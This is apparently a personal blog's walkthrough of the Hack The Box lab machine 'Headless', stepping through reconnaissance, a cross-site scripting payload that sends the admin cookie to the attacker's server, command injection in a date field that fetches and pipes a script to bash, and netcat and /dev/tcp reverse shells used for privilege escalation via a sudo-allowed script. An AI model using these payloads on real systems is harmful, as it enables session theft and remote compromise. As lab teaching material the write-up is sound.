---
title: Hacking "Headless" on HTB
date: 2024-07-08 12:20:08 +05:30
modified: 2024-07-09 00:37:14 +05:30
tags: [hackthebox, hacking, cybersecurity]
description: This post contains the attack steps to hack into Headless on Hack the Box
image: "/hacking-headless/headlesshtb.jpg"
---

# Attacking "Headless" on HackTheBox

<hr>

Ok, let's start, this is the first time I am writing a write on an attack.

**Headless** is a linux system hosing a webpage on a certain port, we will be attacking the machine by looking into this webpage and applying skills like **Web Enumeration**, **Cookie Stealing**, **Cross-Site Scripting**, to get access to the admin cookie and then trying get access to the shell and then finally finishing it off with privilege escalation to get root access with some recon and exploitation.

<hr>

## STEP 1: Reconnaissance

<hr>

Let's do a quick <abbr title="Network Mapper">NMAP</abbr> scan to find out more about the machine and its available ports, if you did not know already, NMAP is an amazing tool that allows you to find out almost all possible ports and information about these ports before attacking during recon.

You can learn more about 👉 <a herf="https://github.com/jasonniebauer/Nmap-Cheatsheet?tab=readme-ov-file#what-is-nmap" target="_blank" rel="noopener">NMAP here</a>.

Once we run the NMAP scan using the following:

```bash
nmap -sC -sV -v -oA headless_nmap {TARGET IP}
```

Looking at the scan results, we can identify that there are two ports available:
1. PORT 22 -> Running OpenSSH
2. PORT 5000 -> Running a web service

Let's explore the web service, we open the browser and search up **{TARGET IP}:5000** also, for good measure lets add the *IP:PORT headless.htb* to /etc/hosts.

After opening the page we find that there is a small window that has a "For questions", let's look at that page... Ah! There is a form! That opens up a lot of possibilities for attacks, let's experiement a little more!

<figure>
<img src="/hacking-headless/page1.png" alt="target website">
<figcaption>Fig 1. Target Website</figcaption>
</figure>

<figure>
<img src="/hacking-headless/page2.png" alt="website form">
<figcaption>Fig 2. Form in Target Website</figcaption>
</figure>

Ok all that information is amazing, but it is not **ALL** about the website, is it?

let's run a directory search with **GoBuster** we do the following and check all the available pages that exist on the website.

```bash
gobuster dir -u http://headless.com:5000 -w /usr/share/wordlists/Directory/big.txt
```

Interesting, we find that there is a **/dashboard** page available, but it has a 500 STATUS, let's see what is going on here, once we open **headless.htb:5000/dashboard** we find that the page is unauthorized, this is because the page doesnt have the right privileges to be executed, huh...

Ok then let's quickly find a way to get our privileges escalated, so that we could get into this dashboard and see what is going on.

<hr>

## STEP 2: The Attack

<hr>

Let's go, launching Burpsuite!

Burpsuite is an amazing web-app Penetration Testing Tool!, from tracking requests to handling a web crawler, it has it all!
Learn more about <a herf="https://www.geeksforgeeks.org/what-is-burp-suite/" target="_blank" rel="noopener">Burpsuite here</a>.

Now lets load the **GET** request that the browser sends when we access */support* page by intercepting it on Burp, in the request there is nothing much, but we do notice that the request has two particular things of interest:
1. There is a variable/key in the request header called "is_admin" with a bunch of hashed data, also called the admin cookie and 
2. The request directly sends the content of the form as plaintext in the request body. 
On a normal note, that is bad as this could lead to several attacks on different type of vulnerabilities. out of which, two we will be using further on!

Going back to the */dashboard* page, we notice that the website mentions that the page has to have the right credentials!

How do we get the right authorization? we will need to confirm that we are an admin, hence giving us the power to send things to the site!
remember the "is_admin" key in the request header? I think we can probably make use of this to gain access to the website as an admin!

Let's try it!

### Cookie Stealing
<hr>

More info <a herf="https://www.tutorialspoint.com/What-is-the-difference-between-session-and-cookies#:~:text=Cookies%20are%20client%2Dside%20files,files%20that%20store%20user%20information.&text=Cookies%20expire%20after%20the%20user,logs%20out%20of%20the%20program." target="blank" rel="noopener"> Here </a> on what a cookie/session id is, we want to be able to get the cookie that the admins use in order to access the website such that we can do what we want on the website as an admin!

Now, in order to steal the admin cookie, the normal method would be to try remote code execution, which is a *classic way* and is fairly simple.

<blockquote><p>NOTE: for this method to work, there shouldnt be a "HTTP-Only" header in the cookie.</p></blockquote>

The code we will be executing such that we get the admin cookie is as follows:
```html
<script>var i=new Image(); i.src="http://{YOUR_IP}:{PORT}/?cookie="+btoa(document.cookie);</script>
```
Where we are tricking the server to give us the cookie that access externals links and send it to our own system as a base64 string using `btoa()` function while trying to get a fake URL to respond.

Before we send this, we have to start a python server by doing so:
```bash
python3 -m http.server 8080
```

Now we intercept */support* page and send it to repeater such that we do not need to keep intercepting the same request again and again.

in repeater we are able to change the content of the request header, so lets do just that.
Let's send the payload script to a bunch of keys in the request and hope that one sticks.

>> SEND IT!

we see that the website says "Hacking Attempt Detected" but do notice that the http server has got something for us!, what is it? Oh, it is a base64 encoded string!
now to decode it, we do something like this:
```bash
echo "{YOUR BASE64 STRING}" | base64 -d
```
Which should hopefully print out a admin cookie!
OH my look what we have here!
```bash
$ is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0
```
It's an admin cookie!

Now let's head back to */dashboard* and try to get access!

Intercept the request to /dashboard using Burp and add a request header with the key "Cookie" and value of the string that you got just now, and forward the request, we should get access to the dashboard page now.

<figure>
<img src="/hacking-headless/page3.png" alt="dashboard page">
<figcaption>Fig 3. Dashboard Page</figcaption>
</figure>

Now let's see our viable options, 

we immediately notice that the page has a Date field, that takes a user input, that would be a great place to start
we will now make a payload that will be loaded onto the server by making the page request this file, the payload will be as follows:
```bash
$ cat payload.sh
/bin/bash -c 'exec bash -i >& /dev/tcp/{YOUR IP}/{SHELL PORT} 0>&1'
```
This payload basically allows us to run a remote shell on the specified "SHELL PORT" over net to the specified "IP ADDRESS".

The payload will be loaded onto the server by requesting the file on a http server on our machine, we will do this by making sure that the payload is available on the same directory that the running http server is on, such that the payload will be available on *http://{YOUR IP}:{PORT}/payload.sh* we will also be running a **listener** on the mentioned "SHELL PORT" in the payload.

The listener can be made using Netcat which is a linux utility tool that allows the user to either read or write on the network, you can read more about <a href="https://www.geeksforgeeks.org/introduction-to-netcat/" target="_blank" rel="noopener">Netcat here</a>.
```bash
sudo nc -lvnp {SHELL PORT}
```

Now we head onto burp, turn ON the intercept and hit "Generate Report" on the dashboard.
with the date field, we will add the following code in order to be able to upload the shell and execute it on the target machine:
```js
date=2024-09-05;curl http://{YOUR IP}:{PORT}/payload.sh|bash
```

And VOILA! we have access to the shell of the target machine!
Now all we need to do is to go hunting in the directories to find the different files, and the **User Flag** ofcourse!

### Privilege Escalation
<hr>

We just got the user flag for this machine, but we are yet to find the root flag, obviously the root flag will be hidden in some directory that is only accessible to the root user, which we are not, hence we have perform privilege escalation in order to be able to run commands as root!

quickly in order to enumerate our target, lets find out all the available commands that the current user is capable of running!
```bash
sudo -l
```

in the output of the above command we notice that the user is allowed to run the file */usr/bin/syscheck* without providing PASSWORD!
lets find out what exactly is this "syscheck", we can read the contents of the file using the "cat" command.
```bash
cat /usr/bin/syscheck
```

After reading through the code we notice that there is a file called "initdb.sh" that runs when the syscheck file is run, we can attack this!
let's create another reverse shell payload by using the echo command:
```bash
echo "nc -e /bin/sh {YOUR IP} {SHELL PORT}" > initdb.sh
```

And provide the file the necessary permissions to execute using:
```bash
chmod +x initdb.sh
```

Now in order to recieve the shell, we will have to open another listener on the second shell port that we put in the payload.
```bash
sudo nc -lvnp {SHELL PORT}
```

Now to execute the attack, we just have to run the file by using:
```bash
sudo /usr/bin/syscheck
```

Let's check the listener if we got access? and VOILA, now we have access to the root shell, but we do notice that the shell is not stable, i.e the reverse shell is not at its fullest potential, we can make our shell stable by doing the following commands:
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
CTRL+Z
stty raw -echo; fg
export TERM=xterm
```

in the above set of commands, we are executing a shell with the pty library in python then suspending the command temporarily, once we suspend we will again spawn the shell using stty that will assign I/O ports to the mentioned process completely in RAW mode and ignore the echo and finally telling linux to convert the current terminal to a **xterm** terminal which is the default type of terminal in linux.

You can read more on the process of <a herf="https://maxat-akbanov.com/how-to-stabilize-a-simple-reverse-shell-to-a-fully-interactive-terminal" target="_blank" rel="noopener">stabilizing a reverse shell here</a>.

We are now on the machine as root!
we can check this by quickly running the "whoami" command!

>> Congratulations, you have Pwned "Headless"!

Now, with just a bit of directory hunting, we can find the root flag on the machine!

<hr>

## STEP 3: Conclusion

With this we will conclude the attack on "Headless" by learning a lost of skill sets on this attack, let's be proud of ourselves for a second, as all the things that we lear'nt during this attack were:
- Reconnaissance
- Web Enumeration
- Directory Enumeration
- Cookie Stealing
- Exploiting using Burpsuite
- Reverse Shell
- Privilege Escalation
- Vulnerability Identification
- Execution Permission Abuse

Congrats again!

<hr>

Well that is all for this machine, it was fun typing out this walkthrough, I will be making more such posts about attacking different **HackTheBox** Machines soon, so stay tuned for those!